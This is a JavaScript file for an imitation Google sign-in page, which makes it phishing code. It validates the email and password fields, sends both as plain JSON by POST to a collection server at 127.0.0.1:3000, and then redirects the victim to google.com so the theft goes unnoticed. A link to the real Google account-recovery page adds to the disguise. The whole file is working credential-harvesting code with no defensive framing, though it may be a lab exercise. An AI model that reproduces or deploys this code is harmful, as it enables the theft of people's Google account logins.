let host_port = "http://127.0.0.1:3000";
let google_username = ""
let google_password = ""

document.getElementById("next_btn").addEventListener("click", function() {
  check_name_or_email_field()
});


$('#name_or_email').keypress(function(event) {
    if (event.keyCode == 13) {
      check_name_or_email_field()
    }
});

function check_name_or_email_field() {
  document.getElementById("name_or_email").style.border = "border: 2px solid red";

  text_form = document.getElementById("name_or_email")
  value = text_form.value;
  hidden_text = document.getElementById("invalid_form_entry");

  tld = (value.includes(".com") || value.includes(".org") || value.includes(".edu") || value.includes(".net"))
  //Check for email length, tld entry, and @ symbol
  if (value.length <=6 || !value.includes("@") || !tld) {
    text_form.style.border = "1px solid red"
    
    if (hidden_text.style.display == "none"){
      hidden_text.style.display = "block";  
    }
  
  } else {
    text_form.style.border = "1px solid grey"
    hidden_text.style.display = "none"; 
    toggle_divs("email_div")
    toggle_divs("password_div")
    document.getElementById("valid_email_display").innerHTML = text_form.value
    google_username = text_form.value
  }
}

function toggle_divs(div_id) {
  var hidden_div = document.getElementById(div_id);
  if (hidden_div.style.display === "none") {
    hidden_div.style.display = "block";
  } else {
    hidden_div.style.display = "none";
  }

}


document.getElementById("forgot_email_btn").addEventListener("click", function() {
  window.location.href='https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
});


document.getElementById("show_password_checkbox").addEventListener("click", function() {
  var password_input = document.getElementById("enter_password");
  var password_checkbox = document.getElementById("show_password_checkbox");
  if(password_checkbox.checked){
    password_input.type = "text"
  } else {
    password_input.type = "password"
  }
});


document.getElementById("next_psswd_btn").addEventListener("click", function() {
  submit_password()
});


$('#enter_password').keypress(function(event) {
    if (event.keyCode == 13) {
      submit_password()
    }
});


function submit_password() {
  google_password = document.getElementById("enter_password")
  value = google_password.value;
  hidden_text = document.getElementById("invalid_password_entry");

  //Check for email length, tld entry, and @ symbol
  if (value.length == 0) {
    google_password.style.border = "1px solid red"
    
    if (hidden_text.style.display == "none"){
      hidden_text.style.display = "block";  

    }

    return
  
  } else {
    //Citation: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send
    google_login = '{"logtype": "GOOGLE", "username":"'+google_username+'", "password":"'+google_password.value+'"}'
    var xhr = new XMLHttpRequest();
    xhr.open("POST", host_port, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
    xhr.setRequestHeader('Accept', '*/*'); // accept all
    xhr.send(google_login);
    window.location.href="https://www.google.com/#"
  }
}